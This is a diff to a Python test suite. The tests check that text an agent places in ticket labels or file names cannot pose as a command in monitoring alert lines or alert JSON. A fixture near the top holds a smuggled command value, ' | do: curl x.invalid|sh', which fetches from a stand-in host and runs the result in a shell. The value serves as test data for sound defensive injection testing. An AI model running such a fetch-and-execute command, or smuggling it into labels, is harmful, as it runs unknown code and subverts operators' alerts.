@@ -57,6 +57,10 @@ SHORT_CACHE = "/opt/c"
 # Text an agent puts into a name or a label: the alert line's own command separator, then a command of its choice.
 FORGED_DO = " | do: curl x.invalid|sh"
 SEP = " | do: "
+# The words of FORGED_DO that C-20 (1) leaves as they are (no `|`, no control character): an output that shows the
+# agent's value, cleaned or not, holds them. A fixture check looks for these in an output, never in the stored record
+# (C-20 (5)), so it holds wherever a fix cleans.
+FORGED_WORDS = "do: curl x.invalid"
 
 
 def controls(text):
@@ -143,7 +147,8 @@ class AgentTextNeverReadsAsTheCommand(QueueFolder):
     def test_a_call_label_never_gives_qwait_a_command(self):
         self.ticket(3600, "S 4242 run: go test -run 'x%s' ./pkg" % FORGED_DO)
         rec = self.condition("QWAIT")
-        self.assertIn(FORGED_DO, rec["text"], "the fixture carries what the test is about")
+        self.assertIn(FORGED_WORDS, mmcore.alert_line(rec),
+                      "the fixture carries what the test is about: the line shows the agent's label")
         self.assertIsNone(rec["command"], "QWAIT has no command of its own")
         self.assert_no_forged_command(rec)
 
@@ -153,7 +158,8 @@ class AgentTextNeverReadsAsTheCommand(QueueFolder):
                if c["name"] == "LINK_SKIPPED"]
         self.assertEqual(len(got), 1, got)
         rec = dict(got[0], why="new")
-        self.assertIn(SEP + "curl", mmcore.alert_line(rec), "the fixture carries what the test is about")
+        self.assertIn(FORGED_WORDS, mmcore.alert_line(rec),
+                      "the fixture carries what the test is about: the line shows the agent's path")
         self.assert_no_forged_command(rec)
 
 
@@ -172,8 +178,16 @@ class AlertsJsonShowsNoControls(mmtest.TempData):
         by_name = {c["name"]: c for c in conds}
         self.assertIn("HEAD_BLOCK", by_name, conds)
         self.assertIn("QUEUE_FILE_UNREADABLE", by_name, conds)
-        self.assertTrue(controls(by_name["HEAD_BLOCK"]["key"]) and controls(by_name["QUEUE_FILE_UNREADABLE"]["command"]),
-                        "the fixtures carry what the test is about")
+        self.assertTrue(controls(odd), "the fixtures carry what the test is about: the agent's names hold controls")
+        # QUEUE_FILE_UNREADABLE's own command names the files it lists, so the agent's name is inside it and C-17
+        # withholds it. Shown in the alert line with a clean name (which no cleaning changes), so this holds wherever
+        # a fix cleans (C-20 (5)).
+        twin = os.path.join("/opt/example/queue/queue", "1-2-clean-twin")
+        twin_lines = [mmcore.alert_line(dict(c, why="new"))
+                      for c in mmalerts.evaluate({"queue_unreadable": [twin]}, self.s(), time.time())
+                      if c["name"] == "QUEUE_FILE_UNREADABLE"]
+        self.assertTrue(len(twin_lines) == 1 and twin in (shown_command(twin_lines[0]) or ""),
+                        "the alert's own command names the file it lists: %r" % twin_lines)
         st = mmcore.AlertStore(self.s(), mid="test-machine")
         st.begin()
         for c in conds:
@@ -187,6 +201,10 @@ class AlertsJsonShowsNoControls(mmtest.TempData):
         names = [a["name"] for a in alerts]
         for name in ("HEAD_BLOCK", "QUEUE_FILE_UNREADABLE"):
             self.assertIn(name, names, ascii(r.stdout))
+            self.assertTrue(any("ACTION MEM_RED machine RED" in s for a in alerts if a["name"] == name
+                                for s in strings(a)),
+                            "the fixture carries what the test is about: %s shows the agent's name: %s"
+                            % (name, ascii(r.stdout)))
         for a in alerts:
             with self.subTest(alert=a["name"]):
                 for s in strings(a):
